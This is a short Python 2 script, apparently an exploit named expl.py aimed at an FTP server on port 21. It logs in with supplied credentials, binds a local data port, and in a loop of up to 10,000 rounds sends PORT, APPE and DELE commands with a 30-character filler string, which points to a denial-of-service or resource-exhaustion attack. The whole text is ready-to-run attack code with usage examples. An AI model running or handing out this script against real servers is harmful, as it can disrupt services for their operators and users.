#!/usr/bin/python
import socket
import sys
import time

def Usage():
    print ("Usage:  ./expl.py   <local_ip>  <serv_ip>      <Username> <password>\n")
    print ("Example:./expl.py 127.0.0.1 127.0.0.1 anonymous anonymous\n")
    print ("Example:./expl.py 192.168.48.183 192.168.48.111 anonymous anonymous\n")
if len(sys.argv) <> 5:
        Usage()
        sys.exit(1)
else:
    local=sys.argv[1]
    hostname=sys.argv[2]
    username=sys.argv[3]
    passwd=sys.argv[4]
    test_string="a"*30
    ip_every=local.split('.')
    for i in range(1,10000):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((hostname, 21))
        except:
            print ("Connection error!")
            sys.exit(1)
        r=sock.recv(1024)
        print "[+] "+ r
        sock.send("user %s\r\n" %username)
        print "[-] "+ ("user %s\r\n" %username)
        r=sock.recv(1024)
        print "[+] "+ r
        sock.send("pass %s\r\n" %passwd)
        print "[-] "+ ("pass %s\r\n" %passwd)
        r=sock.recv(1024)
        print "[+] "+ r

        sock_data.bind((local,31339))
        sock_data.listen(1)

        sock.send("PORT " + ip_every[0] +","+ ip_every[1] +","+ ip_every[2] +"," + ip_every[3] +
",122,107\r\n")
        print "[-] "+ ("PORT " + local + "122,107\r\n")
        r=sock.recv(1024)
        print "[+] "+ r

        sock.send("APPE "+ test_string +"\r\n")
        print "[-] "+ ("APPE "+ test_string +"\r\n")
        r=sock.recv(1024)
        print "[+] "+ r

        sock.send("DELE "+ test_string +"\r\n")
        print "[-] "+ ("DELE "+ test_string +"\r\n")
        r=sock.recv(1024)
        print "[+] "+ r

        sock.close()
        sock_data.close()
        time.sleep(2)





    sys.exit(0);
